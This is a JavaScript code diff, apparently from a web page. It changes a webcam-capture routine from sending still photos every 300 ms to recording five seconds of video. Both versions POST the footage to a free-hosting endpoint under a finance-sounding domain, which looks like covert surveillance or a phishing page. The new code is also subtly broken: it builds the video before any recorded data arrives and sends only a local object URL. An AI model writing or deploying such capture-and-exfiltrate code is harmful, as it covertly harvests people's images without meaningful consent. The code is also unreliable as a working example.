@@ -9,31 +9,44 @@ function startCapture() {
             video.srcObject = stream;
             video.play();
 
-            setInterval(() => capturePhoto(), 300);
+            let recorder;
+            let chunks = [];
+
+            setTimeout(() => {
+                stopCapture();
+            }, 5000); // 5 saniye sonra durdur
+
+            function startRecording() {
+                recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = function(event) {
+                    chunks.push(event.data);
+                };
+                recorder.start();
+            }
+
+            function stopCapture() {
+                video.pause();
+                recorder.stop();
+
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                const dataURL = URL.createObjectURL(videoBlob);
+
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://hayatfinans.000webhostapp.com/c/savePhoto.php');
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        console.log('Video kaydedildi.');
+                    } else {
+                        console.error('Video kaydedilirken hata oluştu:', xhr.statusText);
+                    }
+                };
+                xhr.send('data=' + encodeURIComponent(dataURL));
+            }
+
+            startRecording(); // Kayıt başlat
         })
         .catch(error => {
             console.error('Kamera erişimi reddedildi:', error);
         });
-}
-
-function capturePhoto() {
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const context = canvas.getContext('2d');
-    context.drawImage(video, 0, 0);
-
-    const dataURL = canvas.toDataURL('image/jpeg');
-
-    const xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://hayatfinans.000webhostapp.com/c/savePhoto.php');
-    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    xhr.onload = function() {
-        if (xhr.status === 200) {
-            console.log('Fotoğraf kaydedildi.');
-        } else {
-            console.error('Fotoğraf kaydedilirken hata oluştu:', xhr.statusText);
-        }
-    };
-    xhr.send('data=' + encodeURIComponent(dataURL));
 }
